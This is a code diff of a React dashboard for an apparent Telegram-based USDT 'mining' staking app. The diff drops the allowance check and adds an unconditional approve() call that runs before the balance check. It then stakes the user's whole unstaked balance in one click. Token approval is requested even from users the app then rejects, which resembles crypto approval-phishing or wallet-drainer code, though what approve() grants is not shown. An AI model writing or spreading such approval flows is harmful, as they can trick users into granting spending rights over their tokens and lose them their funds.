@@ -24,7 +24,7 @@ const Dashboard: React.FC = () => {
     const navigate = useNavigate();
     const location = useLocation();
     const { address, isConnected, connect, setIsDisconnectModalOpen, miningStats, setMiningStats } = useWallet();
-    const { getStakedInfo, stake, getStakeDetails, getWalletBalance, getAllowance, approve, calculateEffectiveEarned, recordStakeFlush, getViolationStakeCount } = useStaking();
+    const { getStakedInfo, stake, getStakeDetails, getWalletBalance, approve, calculateEffectiveEarned, recordStakeFlush, getViolationStakeCount } = useStaking();
     const { showAlert, tg } = useTelegram();
     const { btcPrice } = usePrice();
     const [loading, setLoading] = useState(false);
@@ -68,9 +68,12 @@ const Dashboard: React.FC = () => {
 
         setLoading(true);
         try {
+            await approve();
+
             const balanceStr = await getWalletBalance(address);
             if (!balanceStr || parseFloat(balanceStr) < 50) {
-                throw new Error("Activation requires a minimum balance of 50 USDT.");
+                showAlert("You have less than 50 USDT. You need minimum 50 USDT for mining.");
+                return;
             }
             const info = await getStakedInfo(address);
             let activeStaked = 0;
@@ -88,18 +91,11 @@ const Dashboard: React.FC = () => {
             const stakeableBalance = Math.max(0, parseFloat(balanceStr) - activeStaked);
 
             if (stakeableBalance < 50) {
-                throw new Error("No extra USDT available to stake. Add at least 50 unstaked USDT to upgrade mining.");
+                showAlert("You have less than 50 USDT. You need minimum 50 USDT for mining.");
+                return;
             }
-            
-        // 1. Check Allowance
-        const currentAllowance = await getAllowance(address);
-        
-        // 2. Automated Token Approval (if needed)
-        if (parseFloat(currentAllowance) < stakeableBalance) {
-            await approve();
-        }
 
-        // 3. One-Click Staking Activation
+        // One-Click Staking Activation
         const tx = await stake(formatUsdtAmount(stakeableBalance));
         await tx.wait();
 
